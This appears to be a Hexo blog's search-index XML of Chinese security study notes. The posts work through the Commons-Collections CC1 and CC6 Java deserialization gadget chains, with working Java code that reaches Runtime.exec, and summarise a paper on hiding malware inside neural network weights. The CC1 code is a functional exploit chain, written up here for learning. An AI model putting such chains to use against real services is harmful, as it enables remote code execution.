<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CC1</title>
    <url>/2022/10/07/cc1/</url>
    <content><![CDATA[<h1 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h1><p>commons-collections包为Java标准的<code>Collections API</code>提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p>
<p>限制JDK版本为1.8_065以下，CC版本4以下</p>
<p>入口类需要满足可序列化→需要有readObject→…→最后调用.exec</p>
<p><img src="/2022/10/07/cc1/%E6%88%AA%E5%B1%8F2022-05-28_20.18.14.png" alt="截屏2022-05-28 20.18.14.png"></p>
<p>看一下哪个函数调用了Transform：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CC1Test</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token comment">/*普通java反射写法
        Runtime r = Runtime.getRuntime();
        Class c = Runtime.class;
        Method execMethod = c.getMethod("exec", String.class);
        execMethod.invoke(r,"/System/Applications/Calculator.app/Contents/MacOS/Calculator");*/</span>

        <span class="token comment">//InvokerTransform调用</span>
        <span class="token class-name">Runtime</span> rt <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>rt<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>先跟进，然后FindUsages，发现一共有21个函数调用了transform方法</p>
<p><img src="/2022/10/07/cc1/%E6%88%AA%E5%B1%8F2022-05-28_15.40.02.png" alt="截屏2022-05-28 15.40.02.png"></p>
<p>找到TransformedMap里的checkSetValue看到valueTransformer调用了transform，看一下valueTransormer方法，再看一下<code>TransformedMap</code> 是protect所以是在当前文件调用，向上找一下，</p>
<p><img src="/2022/10/07/cc1/%E6%88%AA%E5%B1%8F2022-05-28_16.06.53.png" alt="截屏2022-05-28 16.06.53.png"></p>
<p>找到docorate方法</p>
<p><img src="/2022/10/07/cc1/%E6%88%AA%E5%B1%8F2022-05-28_16.02.11.png" alt="截屏2022-05-28 16.02.11.png"></p>
<p>构造invokerTransform方法，最后decorate方法我们只想调用CheckSetValue，所以只要最后赋值invokerTransformer</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//InvokerTransform调用</span>
<span class="token class-name">Runtime</span> rt <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">InvokerTransformer</span> invokerTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> invokerTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>看一下哪里调用了checkSetValue方法：</p>
<p><img src="/2022/10/07/cc1/%E6%88%AA%E5%B1%8F2022-05-28_16.13.41.png" alt="截屏2022-05-28 16.13.41.png"></p>
<p>如何让Runtime.getRuntime()进行序列化：</p>
<p>他的class可以序列化</p>
<p>正常反射：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> c <span class="token operator">=</span> <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>
<span class="token class-name">Method</span> getRuntimeMethod <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Runtime</span> rt <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">)</span> getRuntimeMethod<span class="token punctuation">.</span><span class="token function">incode</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Method</span> execMethod <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
execMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>rt<span class="token punctuation">,</span><span class="token string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可序列化版本：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Method</span> getRuntimeMethod <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Method</span><span class="token punctuation">)</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Runtime</span> rt <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">)</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>getRuntimeMethod<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>rt<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>一个一个写太麻烦，<code>ChainedTransformer</code> 可以循环调用</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
chainedTransformer<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ysoserial CC1链调用流程：</p>
<p><img src="/2022/10/07/cc1/%E6%88%AA%E5%B1%8F2022-05-28_20.35.33.png" alt="截屏2022-05-28 20.35.33.png"></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//map.put("value","aaa");</span>
        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">Lazymap</span> <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">/*for (Map.Entry entry:transformedMap.entrySet()){
                entry.setValue(rt);
            }*/</span>

        <span class="token class-name">Class</span> c <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Constructor</span> annotationInvocationdhdlConstructor <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        annotationInvocationdhdlConstructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">InvocationHandler</span> h <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> annotationInvocationdhdlConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Override</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Lazymap</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Map</span> mapProxy <span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> h<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Object</span> o <span class="token operator">=</span> annotationInvocationdhdlConstructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Override</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>mapProxy<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//serialize(o);</span>
        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string">"ysoser.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>Java代码审计</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>CC6</title>
    <url>/2022/10/07/cc6/</url>
    <content><![CDATA[<h1 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h1><p>相较于CC1而言，CC6适用于java版本高于8u71，前面的执行方法与CC1类似，主要是用了Transformer.transform</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/*
	Gadget chain:
	    java.io.ObjectInputStream.readObject()
            java.util.HashSet.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
//以下为CC6利用链，以上为CC1共同部分
                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.ChainedTransformer.transform()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()
*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2022/10/07/cc6/%E6%88%AA%E5%B1%8F2022-05-28_21.16.11.png" alt="截屏2022-05-28 21.16.11.png"></p>
]]></content>
      <categories>
        <category>Java代码审计</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>EvilModel:Hiding Malware Inside of Neural Network Models</title>
    <url>/2022/10/07/evilmodel-hiding-malware-inside-of-neural-network-models/</url>
    <content><![CDATA[<h1 id="EvilModel-Hiding-Malware-Inside-of-Neural-Network-Models"><a href="#EvilModel-Hiding-Malware-Inside-of-Neural-Network-Models" class="headerlink" title="EvilModel:Hiding Malware Inside of Neural Network Models"></a>EvilModel:Hiding Malware Inside of Neural Network Models</h1><h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>本文提出了一种通过神经网络模型秘密地传递恶意软件的新方法。神经网络模型解释能力差，泛化能力好。通过在神经元中潜入恶意软件，可以秘密地传递恶意软件，而对神经网络性能影响很小或者没有影响。同时，由于神经网络模型的结构保持不变，因此可以通过防病毒引擎的安全扫描。实验表明：在一个178M的AlexNet模型中可以嵌入36.9M的恶意软件，准确损失率在1%。</p>
<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>恶意软件字节替换或映射模型参数来隐藏神经网络模型中的恶意软件。</p>
<p>StegoNet提出了4种方法：</p>
<ul>
<li>LSB steganography (LSB替换)</li>
<li>resilience training（弹性训练）</li>
<li>value mapping（值映射）</li>
<li>sign-mapping（符号映射）</li>
</ul>
<p>主流框架（TenseorFlow，PyTorch）中的模型参数是32位浮点数。通过将参数的最后几位修改为恶意软件代码，可以在不影响模型性能的情况下嵌入恶意攻击载荷。</p>
<p>在本文中提出了快速替换，通过修改神经元来隐蔽传递malware。与仅修改参数的LSB不同，本文修改了整个神经元以嵌入恶意软件。一般认为隐藏层神经元会影响神经网络的分类结果，因此隐藏层神经元应该是固定的，其参数应该保持不变。事实上，我们发现由于网络层存在<strong>冗余神经元</strong>，一些神经元的变化对神经网络的性能影响不大。此外，在模型结构不变的情况下，隐藏的恶意软件可以逃避反病毒引擎的检测。因此，恶意软件可以通过修改神经元来隐蔽地、隐蔽地嵌入并传递到目标设备。</p>
<p>使用神经网络模型的优势如下：</p>
<p> i) 通过将恶意软件隐藏在神经网络模型中，将恶意软件进行反汇编，使恶意软件的特征不可用，从而使恶意软件能够逃避检测。 </p>
<p>ii) 由于冗余的神经元和出色的泛化能力，修改后的神经网络模型在不同的任务中仍然可以保持性能而不会引起异常。</p>
<p>iii）特定任务中神经网络模型的规模很大，因此可以交付大型恶意软件。 iv) 此方法不依赖其他系统漏洞。 嵌入恶意软件的模型可以通过供应链的模型更新渠道或其他方式交付，不会引起最终用户的关注。 </p>
<p>v）随着神经网络的应用越来越广泛，这种方法将在未来传播恶意软件中普遍存在。</p>
<h2 id="本文贡献："><a href="#本文贡献：" class="headerlink" title="本文贡献："></a>本文贡献：</h2><ul>
<li>我们提出了快速替换以在神经网络模型中嵌入恶意软件</li>
<li>我们研究了DNN 模型嵌入恶意软件的能力以及嵌入的恶意软件对模型性能的影响</li>
<li>我们验证了在不同模型和恶意软件样本上快速替换的可行性</li>
</ul>
<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><h3 id="A-StegoNet"><a href="#A-StegoNet" class="headerlink" title="A. StegoNet"></a>A. StegoNet</h3><p><strong>LSB 替换</strong>。 DNN 模型是多余的。 StegoNet 通过替换参数的最低有效位将恶意软件字节嵌入 DNN 模型。 对于大型 DNN 模型，这种方法可以嵌入大型恶意软件而不会降低性能。 然而，对于小型模型，随着嵌入恶意软件字节数的增加，模型性能急剧下降。</p>
<p><strong>弹性训练</strong>。由于DNN模型具有容错能力，StegoNet通过用恶意软件字节替换参数，故意在神经元参数中引入内部错误。然后对模型进行恢复力训练。“受损神经元”在训练期间不会更新。与LSB替换相比，该方法可以在模型中嵌入更多恶意软件。</p>
<p><strong>值映射</strong>。 StegoNet 搜索模型参数以找到与恶意软件段相似的位，并将参数映射（或更改）恶意软件。通过这种方式，恶意软件可以映射到模型而不会大大降低模型性能。但是，它需要一个排列图来恢复恶意软件。嵌入率低于上述方法。</p>
<p><strong>符号映射</strong>。 StegoNet 还将参数的符号映射到恶意软件位。这种方法限制了可以嵌入的恶意软件的大小，并且在四种方法中嵌入率最低。此外，排列图会很大，使得这种方法不切实际。</p>
<p>这些方法的常见问题是：</p>
<p>i）嵌入率低</p>
<p>ii）对模型性能有显著影响。</p>
<p>这些限制使StegoNet无法在真实场景中有效使用。</p>
<h3 id="B-Related-Work"><a href="#B-Related-Work" class="headerlink" title="B. Related Work"></a>B. Related Work</h3><p>建议使用 IPFS（星际文件系统）来传递恶意软件。 恶意软件的地址对多个参与者隐藏。 通过计算拉格朗日多项式，可以获得IPFS地址的种子，进而计算出恶意软件的地址。提出了使用 DNA 隐写术绕过筛选电子设备的系统的潜力。 使用 DNA 中的四种不同核苷酸对信息进行加密和编码。将区块链作为一种隐蔽的通信渠道，将秘密命令嵌入到比特币的地址中进行传输。 所有交易均受加密算法保护。 但是，它也不适用于传输大数据。</p>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>A. Overall Workﬂow</p>
<p><img src="/2022/10/07/evilmodel-hiding-malware-inside-of-neural-network-models/%E6%88%AA%E5%B1%8F2022-05-15_14.39.59.png" alt="截屏2022-05-15 14.39.59.png"></p>
<p>攻击者希望通过修改神经元的参数将恶意软件样本嵌入到神经网络模型中，而不会对模型的性能产生重大影响。为此，攻击者应遵循以下步骤。首先，攻击者需要得到一个神经网络模型。攻击者可以设计自己的网络，或者从公共存储库下载训练有素的模型。然后攻击者需要使用准备好的数据集在特定任务上训练或微调模型，以获得性能良好的模型。之后，攻击者选择合适的网络层并将恶意软件嵌入模型中。嵌入后，攻击者需要评估模型的性能以确保损失是可以接受的。如果损失超过可接受的范围，攻击者需要 “冻结” 嵌入恶意软件的神经元并重新训练模型以获得更高的性能。 一旦模型准备好，攻击者就可以使用供应链污染等方法将其发布到公共存储库或其他地方。</p>
<p>接收器被认为是在目标设备上运行的程序，可以帮助下载模型并从模型中提取嵌入式恶意软件。接收器可以主动下载并替换目标设备上的现有模型，或者等待默认更新程序更新模型。在接收到模型后，接收方根据预定义的规则从模型中提取恶意软件。然后接收器检查恶意软件的完整性。通常，如果收到并验证了模型，就会集成恶意软件。验证是为了组装。然后，接收者可以立即运行恶意软件，或等到预定的条件。</p>
<h2 id="B-Technical-Design"><a href="#B-Technical-Design" class="headerlink" title="B. Technical Design"></a>B. Technical Design</h2><p><strong>1. 神经网络模型的结构:</strong></p>
<p>神经网络模型通常由输入层，一个或多个隐藏层和一个输出层组成，如图2所示，输入层接收外部信号，并通过输入层神经元将信号发送到神经网络的隐藏层。隐藏层神经元接收来自具有一定连接权重的前一层神经元的传入信号，并在添加一定偏置后输出到下一层。输出层是最后一层。它接收来自隐藏层的传入信号并对其进行处理以获得神经网络的输出。</p>
<p><img src="/2022/10/07/evilmodel-hiding-malware-inside-of-neural-network-models/%E6%88%AA%E5%B1%8F2022-05-15_14.44.52.png" alt="截屏2022-05-15 14.44.52.png"></p>
<p>隐藏层中的神经元对于来自前一层的每个输入信号xi具有连接权重wi。假设神经元的所有输入x = (x1，x2，…，xn)，并且所有连接权重w = (w1，w2，…，wn)，其中n是输入信号的数量 (即前一层的神经元数量)。神经元接收输入信号x，并通过矩阵运算以权重w计算x。然后加入一个偏差b来拟合目标函数。现在神经元的输出是：</p>
<p><img src="/2022/10/07/evilmodel-hiding-malware-inside-of-neural-network-models/Untitled.png" alt="Untitled"></p>
<p>我们可以看到，每个神经元包含n个1个参数，即n个连接权值 (前一层神经元的数量) 和一个偏置。因此，具有m个神经元的神经层总共包含m(n+1) 个参数。在主流的神经网络框架 (PyTorch、TensorFlow等) 中，每个参数都是一个32位的浮点数。因此，每个神经元中参数的大小为32(n+1) 位，即4(n+1) 字节，每层中参数的大小为32m(n+1) 位，即4m(n+1) 字节。</p>
<p><strong>2.Neuron中的参数:</strong> </p>
<p>如上所述，神经元中的参数将被恶意软件替换。由于每个参数都是浮点数，因此攻击者需要将恶意软件中的字节转换为合理的浮点数。为此，我们需要分析参数的分布。图3示出了来自模型中随机选择的神经元的样本参数。神经元中有2048参数。在2048值中，有1001个负数和1047个正数，它们近似1:1，它们分布在区间 (−0.0258，0.0286)中。其中，11个的绝对值小于10-4，占0.537%，97个小于10-3，占4.736%。恶意软件字节可以根据参数在神经元中的分布进行转换。</p>
<p><img src="/2022/10/07/evilmodel-hiding-malware-inside-of-neural-network-models/%E6%88%AA%E5%B1%8F2022-05-15_14.52.53.png" alt="截屏2022-05-15 14.52.53.png"></p>
<p>然后攻击者需要将恶意软件字节转换为32位浮点数在合理的时间间隔内。图4是符合 IEEE的 32位浮点数的格式标准。假设数字以二进制的形式显示为±1.m×2n。转换为浮点数时，第一位是符号位，表示值的符号。第 2-9 位是指数，值为 n+127，可以表示指数范围 2的−127次方至2的+127次方。第10-32位是尾数位，表示 m。通过分析浮点数的格式，可以发现数字的绝对值由指数部分确定，并且可以通过调整指数部分将值固定到一定的时间间隔。例如，如果第 3-6 位设置为 1，并且最后24位设置为任意值（即0x3c000000-0x3cffffff），则浮点数的绝对值介于 0.0078 和 0.0313 之间;如果第4-6个设置为1，则值介于 3 × 10的−5次方 到1.3 ×10的−4次方之间。</p>
<p>因此，在嵌入恶意软件字节时，如果将指数位设置为指定值 (即浮点数的第一个字节为0x3c、0x38、0xbc或0xb8，就可以将恶意软件嵌入到参数中，而无需对参数的值进行太大更改。这样每个参数都可以嵌入3个字节的恶意软件。</p>
<p><strong>3.快速替换：</strong></p>
